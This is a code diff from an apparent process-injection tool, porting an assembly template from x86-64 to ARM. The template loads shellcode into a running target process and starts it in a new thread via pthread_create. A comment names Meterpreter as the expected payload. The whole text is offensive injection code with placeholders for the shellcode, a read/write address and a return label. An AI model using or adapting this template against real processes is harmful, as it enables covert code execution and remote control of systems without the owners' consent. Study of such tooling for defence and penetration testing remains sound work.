@@ -8,22 +8,33 @@
 # happily execute in a separate thread, but if you execute the "exit" 
 # command from the Meterpreter shell, it will kill the entire target process
 
-mov rcx, 0
-lea rax, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
-mov rdx, rax
-mov rsi, 0
-mov rax, arbitrary_read_write_data_address[rip]
-mov rdi, rax
-mov r9, [BASEADDRESS:.+/libpthread-[0-9\.so]+$:BASEADDRESS] + [RELATIVEOFFSET:pthread_create@@GLIBC_2.2.5:RELATIVEOFFSET]
-call r9
+b execute_precompiled_threaded_main
+// import reusable code fragments
+[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
+
+execute_precompiled_threaded_main:
+// load the arbitrary read/write address into r0
+	ldr r0, [pc]
+	b load_shellcode_address
+
+read_write_address:
+	.word [VARIABLE:READ_WRITE_ADDRESS:VARIABLE]
+	.balign 4
+
+call_pthread_create:
+	bl asminject_libpthread_pthread_create
 
 [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
 
 # inlined shellcode will go after this delimiter
 SHELLCODE_SECTION_DELIMITER
 
+load_shellcode_address:
+	mov r2, pc
+	b call_pthread_create
+
 [VARIABLE:INLINE_SHELLCODE:VARIABLE]
 
 jump_back_from_shellcode:
 
-jmp [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]
+b [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]
